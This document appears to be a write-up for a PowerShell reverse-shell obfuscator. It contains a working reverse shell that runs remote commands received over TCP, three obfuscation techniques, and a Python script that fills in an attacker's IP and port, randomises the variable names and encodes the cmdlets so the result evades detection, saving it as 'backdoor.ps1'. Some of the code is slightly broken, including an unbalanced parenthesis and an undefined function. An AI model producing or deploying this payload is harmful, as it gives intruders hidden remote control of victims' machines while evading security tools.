# Theory
> Obfuscation is the deliberate addition of ambiguous, confusing,
> or misleading information to interfere with surveillance and data collection

### Raw Payload
```powershell
$ReverseShellConnection = New-Object System.Net.Sockets.TCPClient("127.0.0.1", 4444)
$NetworkStream = $ReverseShellConnection.GetStream()
$ReadBuffer = New-Object Byte[] 65536

while (($BytesRead = $NetworkStream.Read($ReadBuffer, 0, $ReadBuffer.Length)) -ne 0) {
    $CommandOutput = [System.Text.Encoding]::ASCII.GetString($ReadBuffer, 0, $BytesRead)
    $ExecutedOutput = Invoke-Expression $CommandOutput 2>&1) | Out-String
    $PromptWithOutput = $ExecutedOutput + [Environment]::UserName + '@' + [System.Net.Dns]::GetHostName() + ' [' + $(Get-Location) + ']~$ '
    $OutputBytes = [text.encoding]::ASCII.GetBytes($PromptWithOutput)
    $NetworkStream.Write($OutputBytes, 0, $OutputBytes.Length)
    $NetworkStream.Flush()
}

$ReverseShellConnection.Close()
```

### Powershell Obfuscation Methods
<p>Numeric to string conversion obfuscation</p>
<p>Character code obfuscation</p>
<p>String slicing and indexing obfuscation</p>

```powershell
# NUMERIC CONVERSION -> Write-Host 420
[string]::join('',((87,114,105,116,101,45,72,111,115,116,32,52,50,48)|%{[char]$_}))

# CHARACTER CODE -> Write-Host 420
[char](87)+[char](114)+[char](105)+[char](116)+[char](101)+[char](45)+[char](72)+[char](111)+[char](115)+[char](116)+[char](32)+[char](52)+[char](50)+[char](48)

# STRING SLICING -> Write-Host 420
"zttxirGVRskXrsEFIcH0X2cPLmO WnoruBWUks-f2neGJNIo46"[34,12,4,2,42,38,18,30,13,1,27,48,40,19] -join ""
```

### Match and Replace
<p>Because each method returns a string, we need to include either & and/or & Invoke-Expression</p>

```python
pattern = r"/.+?/"

reverse_shell = """
$ReverseShellConnection = (& (/New-Object/) (/System.Net.Sockets.TCPClient/)(((IP_ADDRESS), (PORT))))
$NetworkStream = $ReverseShellConnection.(/GetStream/)()
$ReadBuffer = (& (/New-Object/) Byte[] 65536)

while (($BytesRead = $NetworkStream.(/Read/)($ReadBuffer, 0, $ReadBuffer.Length)) -ne 0) {
    $CommandOutput = [System.Text.Encoding]::ASCII.GetString($ReadBuffer, 0, $BytesRead)
    $ExecutedOutput = (& (/Invoke-Expression/) $CommandOutput 2>&1) | & (/Out-String/)
    $PromptWithOutput = $ExecutedOutput + $(& (/Invoke-Expression/) (/[Environment]::UserName/))+'@'+$(& (/Invoke-Expression/) (/[System.Net.Dns]::GetHostName()/))+' ['+$(& (/Get-Location/))+']~$ '
    $OutputBytes = ([text.encoding]::ASCII.(/GetBytes/)($PromptWithOutput))
    $NetworkStream.(/Write/)($OutputBytes, 0, $OutputBytes.(/Length/))
    $NetworkStream.(/Flush/)()
}

$ReverseShellConnection.(/Close/)()
"""
```

### Method in Action
<p>Replace your IP_ADDRESS and PORT</p>
<p>Replace each variable with random string</p>
<p>Grab each match and replace it with a random method</p>

```python
# REPLACE IP/PORT
ip_address = input("Enter IP: ")
port = input("Enter port: ")
reverse_shell = reverse_shell.replace("IP_ADDRESS", ip_address)
reverse_shell = reverse_shell.replace("PORT", port)

# REPLACE VARIABLES
variables_2_replace = ["ReverseShellConnection",
                       "NetworkStream",
                       "ReadBuffer",
                       "BytesRead",
                       "CommandOutput",
                       "ExecutedOutput",
                       "PromptWithOutput",
                       "OutputBytes"]

for variable in variables_2_replace:
    random_string = ''.join(random.choices(string.ascii_letters, k=random.randint(1, 20)))
    reverse_shell = reverse_shell.replace(variable, random_string)

# METHOD 1
def list_2_character_2_string(match):
    command = match.group(0)[1:-1]
    return r"[string]::join('',((" + ','.join(str(ord(character)) for character in command) +  r")|%{[char]$_}))"

# METHOD 2
def character_2_string(match):
    command = match.group(0)[1:-1]
    return "+".join("[char]("+str(ord(c))+")" for c in command)

# METHOD 3
def random_string_2_string(match):
    command = match.group(0)[1:-1]
    char_positions = [''] * 150
    indices_used = []
    
    for character in command:
        index = random.choice([i for i in range(150) if char_positions[i] == ''])
        char_positions[index] = character
        indices_used.append(index)
        
    for i in range(len(char_positions)):
        if char_positions[i] == '':
            char_positions[i] = random.choice(string.ascii_letters + string.digits)
            
    return "'" + ''.join(char_positions) + "'[" + ','.join(map(str, indices_used)) + "] -join ''"

# REPLACE EACH MATCH WITH RANDOM METHOD
pattern = r"/.+?/"

for match in range(int(reverse_shell.count("/")/2)):
    reverse_shell = re.sub(pattern,
                           lambda m: random.choice([list_2_character_2_string, character_2_string, random_string_2_string])(m),
                           reverse_shell,
                           count=1)

# PRINT OUTPUT OR WRITE TO FILE
with open('backdoor.ps1', 'w') as c:         OR     print(reverse_shell)
    c.write(script_to_char(reverse_shell))
```
```powershell
# ONE LINE REPLACE METHOD
$ReverseShellConnection = (& (/New-Object/) (/System.Net.Sockets.TCPClient/)(((IP_ADDRESS), (PORT))));$NetworkStream = $ReverseShellConnection.(/GetStream/)();$ReadBuffer = (& (/New-Object/) Byte[] 65536);while (($BytesRead = $NetworkStream.(/Read/)($ReadBuffer, 0, $ReadBuffer.Length)) -ne 0) {$CommandOutput = [System.Text.Encoding]::ASCII.GetString($ReadBuffer, 0, $BytesRead);$ExecutedOutput = (& (/Invoke-Expression/) $CommandOutput 2>&1) | & (/Out-String/);$PromptWithOutput = $ExecutedOutput + $(& (/Invoke-Expression/) (/[Environment]::UserName/))+'@'+$(& (/Invoke-Expression/) (/[System.Net.Dns]::GetHostName()/))+' ['+$(& (/Get-Location/))+']~$ ';$OutputBytes = ([text.encoding]::ASCII.(/GetBytes/)($PromptWithOutput));$NetworkStream.(/Write/)($OutputBytes, 0, $OutputBytes.(/Length/));$NetworkStream.(/Flush/)()};$ReverseShellConnection.(/Close/)()
```
